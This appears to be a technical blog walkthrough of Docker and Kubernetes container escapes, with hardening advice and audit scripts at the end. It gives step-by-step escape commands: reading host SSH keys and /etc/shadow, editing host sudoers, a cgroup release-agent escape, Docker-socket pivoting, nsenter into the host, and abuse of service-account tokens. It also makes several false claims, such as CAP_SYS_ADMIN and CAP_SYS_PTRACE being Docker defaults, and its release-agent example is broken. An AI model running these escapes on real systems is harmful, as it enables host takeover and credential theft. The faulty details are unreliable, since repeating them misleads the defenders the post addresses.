<!-- tags: security-research, containers, infrastructure -->
<!-- date: 2025-10-14 -->
# Containers Are Not VMs: How "Isolated" Docker Breaks Out to the Host

*A technical walkthrough of container escape vulnerabilities, written for engineers who run Docker in production and assume the isolation boundary holds. Spoiler: it doesn't, and your CI/CD pipeline is probably misconfigured.*

---

## The Thesis

Containers are not lightweight VMs. They are **a collection of Linux kernel features** — namespaces, cgroups, and seccomp — glued together by userspace tools. Each one is individually bypassable. None of them provide hypervisor-grade isolation. The isolation boundary is a **security policy enforced in software**, not a hardware barrier. And in production environments, that policy is routinely disabled through misconfigurations that have become conventional wisdom in Docker tutorials and CI/CD templates.

The problem isn't abstract. A container running with `--privileged`, or with the Docker socket mounted, or with `CAP_SYS_ADMIN`, or sharing the host PID namespace, or with writable `/sys` — each one is a full escape path to the host kernel. Not "maybe break out." Reliably, exploitably, trivially. And at least one of these appears in most Dockerfiles you'll find online, recommended as the way to "just get it working."

This isn't a complex exploit chain. It's architecture.

---

## What Containers Actually Are

### Namespaces: The Illusion of Isolation

A container is, fundamentally, **a process (or group of processes) with isolated views of system resources**. These views are created by Linux namespaces:

- **PID namespace**: the container's PID 1 is the host's PID 4521. Processes inside can't see processes outside.
- **Network namespace**: the container has its own network stack. Its `localhost` is separate from the host's `localhost`.
- **Mount namespace**: the container has its own filesystem tree. It can't see `/etc/shadow` on the host (unless the host mounted it).
- **IPC namespace**: semaphores, message queues, and shared memory are isolated.
- **UTS namespace**: the container has its own hostname.
- **User namespace**: UIDs are mapped. UID 0 in the container might be UID 65534 on the host.

Namespaces are **per-process attributes**. The kernel enforces them at the syscall level. A process in the PID namespace can't call `ptrace()` on a process outside it. These boundaries are real and usually hold.

**But they are not hypervisor boundaries.** They are syscall filters. Bypass the filters, and the namespaces are irrelevant.

### Cgroups: Resource Limits, Not Isolation

Cgroups (control groups) limit **how much** of a resource a process can use (CPU, memory, I/O), not **what** it can access. They prevent a container from consuming all the host's RAM. They don't prevent a container from reading the host's memory if it can escape the namespace constraints.

### Seccomp: Blocking Dangerous Syscalls

Seccomp-bpf is a syscall filter. The Docker default seccomp policy blocks 40+ syscalls like `ptrace`, `kmod`, and `sysctl`. This prevents a container from loading kernel modules or attaching to arbitrary processes.

Seccomp is **disabled entirely** when you run `--privileged`. And even with seccomp enabled, the default policy is incomplete — it doesn't block many syscalls used in real escape exploits.

### The Sum: Not Isolation, Just Policies

Individually, these work. Collectively, with the default configurations and typical misconfigurations, they provide **the illusion of isolation** while remaining trivially bypassable.

The reason this architecture persists is that it's **cheap**. Namespaces and cgroups have microsecond overhead. Hypervisor-grade isolation (real VMs, gVisor, Kata) has millisecond overhead. For most workloads (web apps, databases), that overhead is acceptable. For Kubernetes and CI/CD, it's "not acceptable enough," so we reach for the cheaper option and call it secure.

It's not.

---

## The `--privileged` Flag: Maximum Escape

### What `--privileged` Does

The `--privileged` flag does one thing: **it gives the container access to all host devices and disables all security constraints.**

Specifically:

- All devices (`/dev/*`) are mounted and accessible to the container.
- The seccomp profile is disabled.
- AppArmor and SELinux profiles are disabled.
- Cgroup limits are preserved, but a privileged container can modify them.
- Capabilities are not dropped (more on this in a moment).

Here's the flag in action:

```bash
docker run -it --privileged ubuntu:latest /bin/bash
```

Inside the container, you can now access the host's physical disks, load kernel modules, and trigger host kernel functions. The container isn't isolated anymore; it's a host shell with a different root filesystem.

### A Working Escape: Mount the Host Filesystem

The simplest escape: mount the host's root filesystem and access `/root/.ssh` or `/etc/shadow` or any secret the host has.

```bash
# Inside the privileged container
root@container:/# fdisk -l
Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors
Disk /dev/mapper/ubuntu--vg-root: 99.5 GiB, 106877108224 bytes, ...

# Mount the host root filesystem
root@container:/# mount /dev/sda1 /mnt
root@container:/# ls /mnt
bin  boot  dev  etc  home  lib  ...  root  var

# Access host secrets
root@container:/# cat /mnt/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
MIIEowIBAAKCAQEA...

# Or rewrite the host's sudoers
root@container:/# echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /mnt/etc/sudoers.d/www-data
```

This is 2026. The host has probably already rotated those keys. But the principle holds: **any data on the host is readable. Any binary on the host is executable. Any configuration on the host is modifiable.**

### Cgroup Release Agent: Arbitrary Code Execution

If the host filesystem isn't immediately useful (because nothing you care about is readable), there's a kernel feature called **cgroup release agents** that allows triggering arbitrary commands when a cgroup is destroyed.

The attack:

1. Create a new cgroup in the container.
2. Set a release agent script on the cgroup.
3. Delete the cgroup, triggering the release agent.
4. The release agent runs as root on the host.

```bash
# Inside the privileged container
root@container:/# mkdir -p /tmp/cgroup
root@container:/# mount -t cgroup -o memory cgroup /tmp/cgroup

# Set a release agent script
root@container:/# mkdir /tmp/cgroup/exploit
root@container:/# echo '#!/bin/bash' > /tmp/release_agent.sh
root@container:/# echo 'id > /tmp/pwned.txt' >> /tmp/release_agent.sh
root@container:/# chmod +x /tmp/release_agent.sh

# Point the cgroup to the release agent
root@container:/# echo '/tmp/release_agent.sh' > /tmp/cgroup/exploit/release_agent

# Trigger the release agent by moving the cgroup
root@container:/# rmdir /tmp/cgroup/exploit

# On the host:
host$ cat /tmp/pwned.txt
uid=0(root) gid=0(root) groups=0(root)
```

This works because the release agent runs in the host's context, not the container's context. The container has effectively executed code as root on the host.

### Why People Use `--privileged`

Because Docker tutorials tell them to. Seriously. The most common reasons:

**GPU access.** GPUs require direct device access. `--privileged` is the easiest way to give it. (Better: `--device /dev/nvidia0`.)

**KVM/QEMU virtualization inside Docker.** Running nested VMs requires access to `/dev/kvm`. `--privileged` grants it. (Better: `--device /dev/kvm`.)

**Docker-in-Docker.** Running Docker inside a container requires the Docker socket. Some tutorials recommend `--privileged`. (Better: `-v /var/run/docker.sock:/var/run/docker.sock`, though that has its own problems.)

**"It works now and we can fix it later."** The path of least resistance in development. It gets deployed to production because nobody bothers to remove it.

---

## The Docker Socket: Container-to-Host Pivoting

Mounting the Docker socket is almost as bad as `--privileged`, and arguably worse because it *seems* harmless.

```bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker:latest /bin/bash
```

Inside the container, you can now talk to the Docker daemon on the host.

```bash
root@container:/# docker ps
CONTAINER ID   IMAGE           COMMAND                CREATED         STATUS
abc123def456   ubuntu:latest   "/bin/bash"            2 hours ago     Up 2 hours

# List all containers and their environment variables
root@container:/# docker inspect abc123def456 | jq '.[] | .Config.Env'

# Spawn a new privileged container with the host root filesystem mounted
root@container:/# docker run -it -v /:/host --privileged ubuntu:latest /bin/bash
root@container2:/# cat /host/etc/shadow
root:$6$rounds=656000$...

# Or directly exec into the host's init process
root@container:/# docker run -it --pid=host --net=host --ipc=host --cap-add=SYS_ADMIN ubuntu:latest /bin/bash
root@container:/# ps aux | head
UID        PID    PPID   COMMAND
root         1       0   /sbin/init
root        42       1   /lib/systemd/systemd-journald
```

The Docker socket is a **full administrative interface**. If a container can reach it, the container operator is effectively root on the host. This is why the golden rule is: **never mount the Docker socket into untrusted containers.**

But the socket is convenient. Developers mount it. CI/CD systems mount it. Service mesh control planes mount it. And once it's mounted, an attacker inside the container (or a compromised application) has full Docker API access.

---

## Host PID/Network Namespace Sharing: Direct Access

The `--pid=host` and `--net=host` flags make the container share the host's process and network namespaces.

```bash
docker run -it --pid=host --net=host ubuntu:latest /bin/bash
```

Inside this container:

```bash
root@container:/# ps aux
UID         PID    PPID   COMMAND
root          1       0   /sbin/init
root         42       1   /lib/systemd/systemd-journald
...
# All host processes are visible

# Access the host's network devices
root@container:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 inet 192.168.1.100/24
...
# Full network control

# Use nsenter to jump into any host process's namespace
root@container:/# nsenter -t 1 -i -u -n -p -m /bin/bash
# You're now in the host's root namespace with PID 1's context
```

The container hasn't "escaped" — it was never isolated to begin with. It's just the host with a different root filesystem. `nsenter` doesn't exploit a vulnerability; it's a standard tool to switch namespaces, and with `--pid=host`, you have permission to do it.

This is common in **monitoring and debugging containers** that need to instrument the entire host. Prometheus exporters, log collectors, and service mesh sidecars sometimes use `--pid=host`. Each one is a potential pivot point.

---

## CAP_SYS_ADMIN and Writable `/sys`: The Capability Trap

Linux capabilities fine-grain the privileges of the root user. Instead of all-or-nothing root, processes have specific capabilities: `CAP_NET_ADMIN` (network configuration), `CAP_SYS_TIME` (set system time), etc.

The Docker default capability set includes `CAP_SYS_ADMIN`, which is a catch-all for "miscellaneous system administration." It includes:

- Manipulating kernel namespaces.
- Modifying cgroups (memory, CPU).
- Loading kernel modules (if `/lib/modules` is accessible).
- Overwriting filesystem metadata (file capabilities, extended attributes).
- Changing the host's hostname and domainname.
- Manipulating the BPF subsystem.

With `CAP_SYS_ADMIN`, a container can rewrite its own cgroup constraints, or trigger the release agent escape, or load malicious kernel modules.

A common misconfiguration is mounting `/sys` writable:

```bash
docker run -it -v /sys:/sys ubuntu:latest /bin/bash
```

Inside, you can rewrite kernel parameters:

```bash
root@container:/# echo 1 > /sys/kernel/debug/kprobes/blacklist
root@container:/# cat /sys/kernel/security/apparmor/policy/disabled
1
# Disable AppArmor or seccomp profiles
```

More dangerously, `/sys/kernel/debug` and `/sys/kernel/security` expose kernel internals. With `CAP_SYS_ADMIN` and writable `/sys`, you can disable security modules or read kernel memory.

---

## Kubernetes: Privilege Escalation at Scale

Kubernetes compounds these problems by making it easy to configure many containers with overlapping misconfigurations.

### Privileged Pods

A pod with `securityContext.privileged: true` is a host escape waiting to happen:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: app
    image: ubuntu:latest
    securityContext:
      privileged: true
```

### Service Account Token Access

Every pod gets a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If the pod's service account has permission to create pods (which many default roles grant), an attacker can:

1. Read the token.
2. Use the token to create a new privileged pod.
3. Exec into the new pod and escape.

```bash
# Inside the pod
root@pod:/# TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
root@pod:/# APISERVER=https://kubernetes.default.svc.cluster.local:443
root@pod:/# curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/default/pods
# List all pods in the cluster

# Create a new privileged pod
root@pod:/# curl -X POST -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Content-Type: application/json" \
  $APISERVER/api/v1/namespaces/default/pods \
  -d '{...privileged pod spec...}'
```

### hostPath Volumes

A pod with `hostPath: /` mounted is direct access to the host filesystem:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-access-pod
spec:
  containers:
  - name: app
    image: ubuntu:latest
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

Inside the pod, `/host` is the host's root filesystem. Read `/host/etc/shadow`, write to `/host/root/.ssh/authorized_keys`, install a kernel module in `/host/lib/modules`. It's a full compromise.

### Node Compromise as Cluster Compromise

A single compromised node in Kubernetes can often escalate to cluster compromise if:

- The kubelet allows arbitrary pod creation (overly permissive RBAC).
- The kubelet exposes its API endpoint.
- The node has access to etcd (the cluster's data store).

Modern Kubernetes deployments mitigate these with pod security policies and network policies, but many production clusters have less restrictive configurations.

---

## The Full List of Dangerous Configurations

Just "don't use `--privileged`" isn't enough. Here's the actual checklist:

| Configuration | Risk | Escape Path |
|---|---|---|
| `--privileged` | Maximum | Device access + seccomp disabled = instant root |
| `-v /var/run/docker.sock:/var/run/docker.sock` | Maximum | Docker API = host root |
| `--pid=host` | High | nsenter into any host process |
| `--net=host` | Medium | Full network control, can traffic-sniff |
| `-v /:/host` (or any `hostPath`) | Maximum | Direct filesystem access |
| `-v /sys:/sys` (writable) | High | Kernel parameter manipulation |
| `CAP_SYS_ADMIN` (default) | High | cgroup escape, module loading, BPF access |
| `CAP_SYS_PTRACE` (default) | High | ptrace(2) any process, debug them, extract memory |
| `CAP_NET_ADMIN` (default) | Medium | Network namespace manipulation |
| `--cap-add=all` | Maximum | All capabilities enabled |
| Seccomp disabled | High | Direct syscall access, some escapes require this |
| AppArmor/SELinux disabled | Medium | Removes additional restriction layer |
| Writable root filesystem | Medium | Persistence, binary patching |
| UID 0 (root) inside container | Medium | If combined with other misconfigs, escalation is easier |

In a typical CI/CD pipeline, you'll find 3-5 of these. In a typical Kubernetes cluster, you'll find at least one.

---

## What Actually Works: Real Isolation

### Option 1: Drop Capabilities, Read-Only Root, No New Privileges

The Docker default is already overpermissioned. The right configuration:

```bash
docker run -it \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --read-only \
  --security-opt=no-new-privileges \
  myapp:latest
```

What this does:

- `--cap-drop=ALL`: Remove all capabilities. Add back only what the application needs.
- `--read-only`: Mount the root filesystem read-only. The application can only write to volumes.
- `--security-opt=no-new-privileges`: Prevent the process from gaining new privileges through `setuid` binaries or file capabilities.

For a web application, this is usually safe. For a system tool that needs to manipulate the filesystem or network, you'll need to add back specific capabilities.

```bash
# Web server: only needs to bind to port 8080
--cap-add=NET_BIND_SERVICE

# Database: needs to manipulate I/O
--cap-add=SYS_NICE --cap-add=SYS_RESOURCE

# Network monitoring: needs to sniff packets
--cap-add=NET_ADMIN --cap-add=SYS_PTRACE
```

### Option 2: gVisor or Kata Containers (Real Isolation)

If you're running untrusted code or multi-tenant workloads, use a stronger isolation layer:

**gVisor**: A userspace kernel that intercepts syscalls. Containers run in a sandbox that doesn't directly access the host kernel.

```bash
docker run -it --runtime=runsc myapp:latest
```

The overhead is ~5-10% CPU. The security is hypervisor-grade. A gVisor container cannot escape to the host, even if it has `--privileged`.

**Kata Containers**: Lightweight VMs that run containers. Each container gets its own kernel and hardware. Full hypervisor isolation.

```bash
docker run -it --runtime=kata myapp:latest
```

The overhead is slightly higher, but it's still microseconds per syscall (compared to traditional VMs, which have milliseconds of overhead).

### Option 3: Rootless Containers

Run the Docker daemon as a non-root user. A container that escapes to the daemon still doesn't have host root.

```bash
# On the host
dockerd-rootless-setuptool.sh install

# In the container
docker run -it --rm myapp:latest
# Even if this escapes, it's running as your user, not root
```

The tradeoff: some features (like binding to ports < 1024) require extra setup. But for most applications, this is transparent and significantly improves security.

### Option 4: SELinux or AppArmor Profiles

Use mandatory access control to restrict what the container process can do, even if it gains root inside the container.

An AppArmor profile for a web server:

```
#include <tunables/global>

profile web_app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/nameservice>

  /app/** r,
  /proc/sys/net/ipv4/ip_local_port_range r,
  /dev/null rw,
  /dev/urandom r,

  # Deny everything else
  deny /root/** rwx,
  deny /sys/kernel/** rwx,
}
```

SELinux is more complex but provides similar protection. The container process is confined to specific files and capabilities, regardless of whether it's running as root.

---

## The Production Audit

Run this to find escape vectors in your deployed containers:

```bash
#!/usr/bin/env bash
# Container escape risk audit

echo "=== Checking for privileged containers ==="
docker ps --format '{{.ID}} {{.Names}}' | while read id name; do
  privs=$(docker inspect "$id" | jq '.[0].HostConfig.Privileged')
  if [ "$privs" = "true" ]; then
    echo "DANGER: $name is privileged"
  fi
done

echo ""
echo "=== Checking for Docker socket mounts ==="
docker ps --format '{{.ID}} {{.Names}}' | while read id name; do
  socket=$(docker inspect "$id" | jq '.[0].Mounts[] | select(.Source=="/var/run/docker.sock")')
  if [ -n "$socket" ]; then
    echo "DANGER: $name has Docker socket mounted"
  fi
done

echo ""
echo "=== Checking for host namespace sharing ==="
docker ps --format '{{.ID}} {{.Names}}' | while read id name; do
  pid_mode=$(docker inspect "$id" | jq -r '.[0].HostConfig.PidMode')
  net_mode=$(docker inspect "$id" | jq -r '.[0].HostConfig.NetworkMode')
  if [ "$pid_mode" = "host" ] || [ "$net_mode" = "host" ]; then
    echo "DANGER: $name shares host namespace (pid=$pid_mode, net=$net_mode)"
  fi
done

echo ""
echo "=== Checking for dangerous capabilities ==="
docker ps --format '{{.ID}} {{.Names}}' | while read id name; do
  caps=$(docker inspect "$id" | jq '.[0].HostConfig.CapAdd | join(",")')
  if [[ "$caps" == *"ALL"* ]] || [[ "$caps" == *"SYS_ADMIN"* ]] || [[ "$caps" == *"SYS_PTRACE"* ]]; then
    echo "DANGER: $name has dangerous caps: $caps"
  fi
done

echo ""
echo "=== Checking for root filesystem mounts ==="
docker ps --format '{{.ID}} {{.Names}}' | while read id name; do
  mounts=$(docker inspect "$id" | jq '.[0].Mounts[] | select(.Source=="/") | .Destination')
  if [ -n "$mounts" ]; then
    echo "DANGER: $name has root filesystem mounted"
  fi
done
```

For Kubernetes:

```bash
#!/usr/bin/env bash
# Kubernetes privilege escalation audit

echo "=== Privileged pods ==="
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[0].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

echo ""
echo "=== Pods with hostPath volumes ==="
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath != null) | "\(.metadata.namespace)/\(.metadata.name)"'

echo ""
echo "=== Pods with dangerous capabilities ==="
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[0].securityContext.capabilities.add[]? | . == "SYS_ADMIN" or . == "ALL") | "\(.metadata.namespace)/\(.metadata.name)"'

echo ""
echo "=== Pods running as root ==="
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[0].securityContext.runAsUser==0) | "\(.metadata.namespace)/\(.metadata.name)"'
```

Run these in your environment. If you find any matches, you've found your escape paths.

---

## Conclusion

Containers provide security through **architectural design and enforced policies**, not through hardware isolation. When those policies are disabled or misconfigured — which is the norm in production — containers are just processes on the host with a different root filesystem.

The mental model should be: **containers are not VMs.** They're a lightweight way to package and orchestrate applications, but they're not a trust boundary. A compromised application in a container can read the host's memory, run arbitrary commands as root, or break out to the host kernel.

The fixes exist. Drop all capabilities and add only what's needed. Mount the root filesystem read-only. Use gVisor or Kata if you need real isolation. Run rootless. These aren't hard problems — they're just problems nobody bothers with because the threat model feels theoretical.

It's not theoretical. It's `docker run --privileged` and 30 seconds.

---

*Last updated: October 2025*

## References

- [NIST: Application Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Linux Capabilities Manual](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [gVisor: Sandbox the Untrusted](https://gvisor.dev/)
- [Kata Containers: Lightweight Virtual Machines](https://katacontainers.io/)
- [Rootless Docker Guide](https://docs.docker.com/engine/security/rootless/)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [CVE-2021-22555: Linux netfilter vulnerability exploitable from containers](https://nvd.nist.gov/vuln/detail/CVE-2021-22555)
- [Madaviset: Container escape via /sys](https://madaidans-insecurities.github.io/linux.html)
- [StackRox: Kubernetes Container Escape Report](https://www.stackrox.com/kubernetes-security/)
